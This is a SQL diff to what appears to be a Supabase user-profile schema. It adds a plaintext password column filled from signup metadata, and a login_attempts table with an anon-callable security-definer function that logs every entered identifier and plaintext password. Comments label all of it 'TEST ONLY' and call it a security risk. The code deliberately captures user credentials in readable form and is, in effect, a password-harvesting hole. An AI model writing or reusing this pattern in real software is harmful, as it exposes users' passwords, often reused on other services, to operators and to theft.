@@ -3,8 +3,13 @@
 create table if not exists public.profiles (
   id uuid references auth.users on delete cascade primary key,
   username text unique not null,
+  -- TEST ONLY: readable plain-text password copy. Remove before production.
+  password text,
   created_at timestamp with time zone default now()
 );
+
+-- If the table already exists, add the column:
+alter table public.profiles add column if not exists password text;
 
 alter table public.profiles enable row level security;
 
@@ -22,10 +27,12 @@ create policy "Users can update their own profile"
 create or replace function public.handle_new_user()
 returns trigger as $$
 begin
-  insert into public.profiles (id, username)
+  insert into public.profiles (id, username, password)
   values (
     new.id,
-    new.raw_user_meta_data->>'username'
+    new.raw_user_meta_data->>'username',
+    -- TEST ONLY: plain-text password captured from signup metadata.
+    new.raw_user_meta_data->>'password'
   );
   return new;
 end;
@@ -56,3 +63,45 @@ end;
 $$;
 
 grant execute on function public.get_email_for_username(text) to anon, authenticated;
+
+-- =====================================================================
+-- TEST ONLY: capture every login attempt (identifier + plain-text
+-- password + whether it succeeded). Remove this whole block before
+-- production -- storing entered passwords like this is a security risk.
+-- =====================================================================
+create table if not exists public.login_attempts (
+  id bigint generated always as identity primary key,
+  identifier text,
+  password text,
+  success boolean,
+  reason text,
+  created_at timestamp with time zone default now()
+);
+
+alter table public.login_attempts add column if not exists identifier text;
+alter table public.login_attempts add column if not exists password text;
+alter table public.login_attempts add column if not exists success boolean;
+alter table public.login_attempts add column if not exists reason text;
+alter table public.login_attempts add column if not exists created_at timestamp with time zone default now();
+
+alter table public.login_attempts enable row level security;
+
+-- No SELECT policy: only the service role / dashboard can read these rows.
+create or replace function public.log_login_attempt(
+  p_identifier text,
+  p_password text,
+  p_success boolean,
+  p_reason text default null
+)
+returns void
+language plpgsql
+security definer
+set search_path = public
+as $$
+begin
+  insert into public.login_attempts (identifier, password, success, reason)
+  values (p_identifier, p_password, p_success, p_reason);
+end;
+$$;
+
+grant execute on function public.log_login_attempt(text, text, boolean, text) to anon, authenticated;
